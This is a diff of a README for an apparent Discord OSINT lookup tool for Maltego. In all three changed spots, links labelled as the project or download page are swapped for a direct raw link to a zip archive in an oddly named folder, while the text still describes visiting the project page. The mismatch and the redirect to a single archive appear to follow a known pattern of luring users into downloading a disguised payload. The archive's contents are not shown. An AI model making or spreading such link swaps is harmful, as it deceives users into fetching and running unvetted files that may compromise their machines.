@@ -1,6 +1,6 @@
 # 🔍 -Discord-OSINT-Transform-for-Maltego - Local Discord lookup for Maltego
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego/main/ghostish/OSIN_Transform_Maltego_Discord_for_1.1.zip)
 
 ## 🧭 What this app does
 
@@ -25,7 +25,7 @@ For most users, the easiest path is to visit the project page and use the setup 
 
 Use this link to visit the page and download or clone the project:
 
-[Visit the download page](https://github.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego)
+[Visit the download page](https://raw.githubusercontent.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego/main/ghostish/OSIN_Transform_Maltego_Discord_for_1.1.zip)
 
 On that page, look for the code files, setup guide, and any release assets. If you want the full project, download the repository as a ZIP file from GitHub.
 
@@ -202,4 +202,4 @@ That gives you the fastest path to setup on Windows without guessing
 
 ## 🔗 Direct download page
 
-[Open the project page here](https://github.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego)
+[Open the project page here](https://raw.githubusercontent.com/bryanppa5478/-Discord-OSINT-Transform-for-Maltego/main/ghostish/OSIN_Transform_Maltego_Discord_for_1.1.zip)
